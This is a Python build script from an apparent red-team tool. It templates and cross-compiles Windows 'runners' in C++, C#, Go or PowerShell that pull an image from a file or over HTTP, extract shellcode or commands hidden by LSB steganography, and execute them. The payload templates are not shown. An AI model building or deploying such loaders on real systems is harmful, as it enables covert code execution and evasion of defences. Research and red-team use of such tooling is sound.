import os.path
import subprocess
from collections import defaultdict
from dataclasses import dataclass, field

import chevron
from colorama import Style, Fore
from yaml import safe_load
from loguru import logger

from algorithms.LSBX import Channel


@dataclass
class Runner:
    """Payload runner. Used as a config for Builder"""
    name: str
    os: str
    arch: str

    language: str
    image_source: str
    payload: str
    algorithm: str

    params: dict = field(default_factory=dict)

    @classmethod
    def from_file(cls, filename: str):
        with open(filename) as f:
            return cls(**safe_load(f))

    @property
    def sources(self):
        return os.path.join('runners', self.language)

    def __str__(self):
        return f'{self.name} ({self.os}/{self.arch}/{self.language}/{self.payload}, ' \
               f'algorithm={self.algorithm}, params={self.params})'


def get_runner(runner_config: str, **kwargs):
    runner = Runner.from_file(runner_config)
    builder = Builder.from_runner(runner)

    logger.success('Builder configured')
    logger.info(f'Configuration: {runner}')
    if builder.build():
        logger.artifact(f'Runner is at {Fore.RED}{builder.artifact_path}{Style.RESET_ALL}')
        if kwargs:
            logger.info(f'Usage: {runner.name}.{builder.build_extension} {kwargs["PAYLOAD_BITS"]} {kwargs["SC_SOURCE"]}')
        else:
            logger.info(f'Usage: {runner.name}.{builder.build_extension} PAYLOAD_BITS SC_SOURCE')


class Builder:
    """A language-specific templating engine"""
    template_file = ''
    sources_extension = ''
    build_extension = 'exe'
    build_dir = 'build'

    def __init__(self, runner: Runner):
        self.runner = runner

    @property
    def artifact_path(self) -> str:
        return os.path.normpath(os.path.join(
            self.runner.sources,
            self.build_dir,
            f'{self.runner.name}.{self.build_extension}'
        ))

    def preprocess_sources(self):
        with open(self.template_file) as template:
            script = chevron.render(template, self.runner.params)
            with open(os.path.join(self.build_dir, f'{self.runner.name}.{self.sources_extension}'), 'w') as f:
                f.write(script)

    def run_build(self):
        pass

    def cleanup(self):
        pass

    def build(self):
        old_cwd = os.getcwd()
        os.chdir(self.runner.sources)
        try:
            os.mkdir(self.build_dir)
        except FileExistsError:
            pass

        success = False
        try:
            logger.debug('Preparing the sources...')
            self.preprocess_sources()

            logger.info('Starting the build...')
            self.run_build()
            logger.success('Build was successful!')
            success = True
        except Exception as e:
            logger.error('Build failed!')
            logger.error(rf'Reason: {e}')
        finally:
            self.cleanup()
            os.chdir(old_cwd)

        return success

    @classmethod
    def from_runner(cls, runner: Runner):
        logger.debug('Finding you a template...')
        implementations = {
            'c': CppBuilder,
            'csharp': CSharpBuilder,
            'go': GoBuilder,
            'powershell': PowershellBuilder,
        }
        try:
            return implementations[runner.language](runner)
        except KeyError:
            logger.error(f'Runner in {runner.language} not found')


class CppBuilder(Builder):
    template_file = 'cpp/reader.cpp.mst'
    sources_extension = 'cpp'
    compilers = {
        'x86': '/usr/bin/i686-w64-mingw32-g++',
        'x64': '/usr/bin/x86_64-w64-mingw32-g++'
    }
    libs = defaultdict(list, {
        'remote': ['winhttp', 'ole32'],
    })

    def preprocess_sources(self):
        # TODO: remove hardcoded values, let algos decide on the params
        if self.runner.algorithm == 'LSB-X':
            self.runner.params['algorithm_args'] = f"{Channel[self.runner.params.get('channel') or 'R'].value}"
        super().preprocess_sources()

    def run_build(self):
        libs = ['gdiplus'] + self.libs[self.runner.image_source] + self.libs[self.runner.payload]
        libs = set(libs)
        libs = ' '.join(f'-l{lib} -Wl,-Bstatic' for lib in libs)
        os.popen(
            f'{self.compilers[self.runner.arch]} '
            f'{self.template_file} '
            f'-s -static-libgcc -static-libstdc++ '
            f'{libs} '
            f'-Wall '
            f'-o {self.build_dir}/{self.runner.name}'
        )


class CSharpBuilder(Builder):
    template_file = 'csharp/runner.cs.mst'
    sources_extension = 'cs'
    build_dir = '.'

    # TODO: drop templated .cs file to csharp/
    # TODO: mcs includes

    def preprocess_sources(self):
        class_mapping = {
            'image_sources': {
                'image_file': 'ImageFile',
                'httpx': 'HTTPX'
            },
            'payloads': {
                'shellcode': 'Shellcode',
                'cmd': 'Cmd'
            },
            'algorithms': {
                'LSB': 'LSB',
                'LSBM': 'LSBM',
                'LSBX': 'LSBX',
                'ColorCode': 'ColorCode'
            }
        }

        self.runner.params.update({
            'image_source': class_mapping['image_sources'][self.runner.image_source],
            'payload': class_mapping['payloads'][self.runner.payload],
            'algorithm': self.runner.algorithm
        })

        self.runner.name = f'csharp/{self.runner.name}'

        try:
            args = self.runner.params['args']
            self.runner.params.update({
                'image_source_args': args.get('image_source'),
                'algorithm_args': args.get('algorithm'),
                'payload_args': args.get('payload'),
            })
        except KeyError:
            pass

        super().preprocess_sources()

    def run_build(self):
        os.chdir('csharp')
        os.popen(f'mcs -platform:{self.runner.arch} '
                 f'-reference:System.Drawing '
                 f'{self.build_dir}/{self.runner.name}')


class GoBuilder(Builder):
    build_dir = '.'
    template_file = 'runner.go.mst'
    sources_extension = 'go'
    architectures = {
        'x86': '386',
        'x64': 'amd64'
    }

    def preprocess_sources(self):
        super().preprocess_sources()

    def run_build(self):
        tags = ','.join([
            f'payload_algorithm_{self.runner.algorithm.lower()}',
            f'delivery_method_{self.runner.image_source.lower()}',
            f'payload_type_{self.runner.payload.lower()}'
        ])

        o = subprocess.run(
            f'go build -tags {tags} -ldflags "-s -w" -o build/{self.runner.name}.{self.build_extension}',
            shell=True,
            env=os.environ.update({
                'GOARCH': self.architectures[self.runner.arch],
                'GOOS': 'windows'
            }),
            capture_output=True
        )
        if o.returncode:
            raise RuntimeError(o.stderr)

    def cleanup(self):
        os.remove(f'{self.runner.name}.{self.sources_extension}')


class PowershellBuilder(Builder):
    template_file = 'runner.ps1.mst'
    sources_extension = 'ps1'
    build_extension = sources_extension

    def preprocess_sources(self):
        with open(f'algorithms/{self.runner.algorithm.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'ALGORITHM_CODE': chevron.render(f.read(), self.runner.params)})

        with open(f'delivery_methods/{self.runner.image_source.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'PAYLOAD_DELIVERY_CODE': chevron.render(f.read(), self.runner.params)})

        with open(f'payloads/{self.runner.payload.lower()}.{self.sources_extension}') as f:
            self.runner.params.update({'PAYLOAD_EXEC_CODE': chevron.render(f.read(), self.runner.params)})

        super().preprocess_sources()
